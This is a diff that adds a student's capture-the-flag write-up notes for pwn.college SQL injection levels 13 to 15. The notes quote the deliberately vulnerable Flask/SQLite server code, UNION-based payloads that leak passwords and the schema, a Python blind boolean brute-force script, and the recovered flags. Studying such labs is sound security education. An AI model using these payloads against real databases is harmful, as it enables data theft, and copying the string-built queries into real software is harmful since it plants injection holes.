@@ -1368,3 +1368,177 @@ HINT: If you're wondering why your solution isn't working, make sure what you're
       - see image.
       - use `--` to comment out trailing characters to avoid error
 ![alt text](image.png)
+
+13. SQLi 3
+    If you recall, your command injection exploits typically caused additional commands to be executed. So far, your SQL injections have simply modified the conditions of existing SQL queries. However, similar to how the shell has ways to chain commands (e.g., ;, |, etc), some SQL queries can be chained as well!
+
+    An attacker's ability to chain SQL queries has extremely powerful potential. For example, it allows the attacker to query completely unintended tables or completely unintended fields in tables, and leads to the types of massive data disclosures that you read about on the news.
+
+    This level will require you to figure out how to chain SQL queries in order to leak data. Good luck!
+    - my solution
+    - /challenge/server:
+        ...
+        db.execute(f"""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [open("/flag").read()])
+        # https://www.sqlite.org/lang_insert.html
+        db.execute(f"""INSERT INTO users SELECT "guest" as username, "password" as password""")
+
+
+        @app.route("/", methods=["GET"])
+        def challenge():
+            query = flask.request.args.get("query", "%")
+
+            try:
+
+                # https://www.sqlite.org/lang_select.html
+                sql = f'SELECT username FROM users WHERE username LIKE "{query}"'
+                print(f"DEBUG: {query=}")
+                results = "\n".join(user["username"] for user in db.execute(sql).fetchall())
+        ...
+
+    QUERY: %" UNION SELECT password FROM users --
+    OUTPUT:
+        DEBUG: query='%" UNION SELECT password FROM users --'
+        127.0.0.1 - - [24/Jun/2025 06:15:17] "GET /?query=%25"+UNION+SELECT+password+FROM+users+-- HTTP/1.1" 200 -
+
+    DISPLAY:
+        Query:
+
+        SELECT username FROM users WHERE username LIKE "%" UNION SELECT password FROM users --"
+
+
+        Results:
+
+        admin
+        guest
+        password
+        pwn.college{gA9xl_xwW8ZeaR0RxYHRVQMF4bH.QXxkzMzwiNxQjMyEzW}
+
+
+14. SQLi 4
+
+    So far, the database structure has been known to you (e.g., the name of the users table), allowing you to knowingly craft your queries. As a developer, you might be tempted to prevent this by, say, randomizing your table names, so that an attacker can't specify them to query data that they are not supposed to. Unfortunately, this is not the slam dunk that you might think it is.
+
+    Databases are complex and much too clever for their own good. For example, almost all modern databases keep the database layout specification itself in a table. Attackers can query this table to get the table names, field names, and whatever other information they might need!
+
+    In this level, the developers have randomized the name of the (previously known as) users table. Find it, and find the flag!
+
+    - my solution:
+    - /challenge/server:
+            ...
+            db = TemporaryDB()
+
+            random_user_table = f"users_{random.randrange(2**32, 2**33)}"
+            db.execute(f"""CREATE TABLE {random_user_table} AS SELECT "admin" AS username, ? as password""", [open("/flag").read()])
+            # https://www.sqlite.org/lang_insert.html
+            db.execute(f"""INSERT INTO {random_user_table} SELECT "guest" as username, "password" as password""")
+
+
+            @app.route("/", methods=["GET"])
+            def challenge():
+                query = flask.request.args.get("query", "%")
+
+                try:
+                    # https://www.sqlite.org/schematab.html
+                    # https://www.sqlite.org/lang_select.html
+                    sql = f'SELECT username FROM {random_user_table} WHERE username LIKE "{query}"'
+                    print(f"DEBUG: {query=}")
+                    results = "\n".join(user["username"] for user in db.execute(sql).fetchall())
+            ...
+
+        Query:
+
+        SELECT username FROM REDACTED WHERE username LIKE "%" UNION SELECT tbl_name FROM sqlite_master --"
+            (QUERY: %" UNION SELECT tbl_name FROM sqlite_master --)
+
+        Results:
+
+        admin
+        guest
+        users_5229999126
+
+
+        Query:
+
+        SELECT username FROM REDACTED WHERE username LIKE "%" UNION SELECT password FROM REDACTED --"
+            (QUERY: %" UNION SELECT password FROM users_5229999126 --)
+
+        Results:
+
+        admin
+        guest
+        password
+        pwn.college{4KLg1LTfhiP21IqEZxa55ItCKsE.QXykzMzwiNxQjMyEzW}
+
+        
+
+15. SQLi 5
+
+    SQL injection happen in all sorts of places in an application and, like command injections, sometimes the result of the query is not sent back to you. With command injections, this case is easier: the commandline is so powerful that you can do a lot of things even blindly. With SQL injections, this is sometimes not the case. For example, unlike some other databases, the SQLite database used in this module cannot access the filesystem, execute commands, and so on.
+
+    So, if the application does not show you the data resulting from your SQL injection, how do you actually leak the data? Sometimes, even if the actual data is not shown, you can recover one bit! If the result of a query can make the application act two different ways (say, redirecting to an "Authentication Success" page versus an "Authentication Failure" page), then an attacker can carefully craft yes/no questions that they can get answers to.
+
+    This challenge gives you exactly this scenario. Can you leak the flag?
+
+    - my solution:
+    - /challenge/server:
+        ...
+        db = TemporaryDB()
+
+        # https://www.sqlite.org/lang_createtable.html
+        db.execute("""CREATE TABLE users AS SELECT "admin" AS username, ? as password""", [open("/flag").read()])
+        # https://www.sqlite.org/lang_insert.html
+        db.execute("""INSERT INTO users SELECT "guest" as username, 'password' as password""")
+
+
+        @app.route("/", methods=["POST"])
+        def challenge_post():
+            username = flask.request.form.get("username")
+            password = flask.request.form.get("password")
+            if not username:
+                flask.abort(400, "Missing `username` form parameter")
+            if not password:
+                flask.abort(400, "Missing `password` form parameter")
+
+            try:
+                # https://www.sqlite.org/lang_select.html
+                query = f"SELECT rowid, * FROM users WHERE username = '{username}' AND password = '{ password }'"
+                print(f"DEBUG: {query=}")
+                user = db.execute(query).fetchone()
+            except sqlite3.Error as e:
+                flask.abort(500, f"Query: {query}\nError: {e}")
+
+            if not user:
+                flask.abort(403, "Invalid username or password")
+
+            flask.session["user"] = username
+            return flask.redirect(flask.request.path)
+        ...
+
+
+    27.0.0.1 - - [24/Jun/2025 06:46:48] "GET / HTTP/1.1" 200 -
+    DEBUG: query="SELECT rowid, * FROM users WHERE username = 'admin' AND password = '' UNION SELECT 1, username, password FROM users WHERE username='admin' --'"
+        (QUERY: ' UNION SELECT 1, username, password FROM users WHERE username='admin' --)
+    127.0.0.1 - - [24/Jun/2025 06:47:17] "POST / HTTP/1.1" 302 -
+
+    - wrote a python script to automate password testing
+    - PYTHON:
+        import requests
+        URL = "http://challenge.localhost:80"
+        flag = ""
+
+        chars = "aAbBcCdDeEfFgGhHiIjJkKlLmMnNoOpPqQrRsStTuUvVwWxXyYzZ0123456789_-.,{} "
+        for i in range(1, 63):
+                for c in chars:
+                        payload = f" ' OR SUBSTR((SELECT password FROM users WHERE username='admin'),{i},1) = '{c}' --"
+
+                        resp = requests.post(URL, data={"username":"admin","password":payload}, allow_redirects=False)
+                        if resp.status_code==302:
+                                flag+=c
+                                print(f"[+] Found char {i}: {c}")
+                                break
+        print(f"Flag: {flag}")
+
+
+    ...
+    Flag: pwn.college{ILd0xw5E3A5RAULUy7j5-NPJR8h.QXzkzMzwiNxQjMyEzW}
+
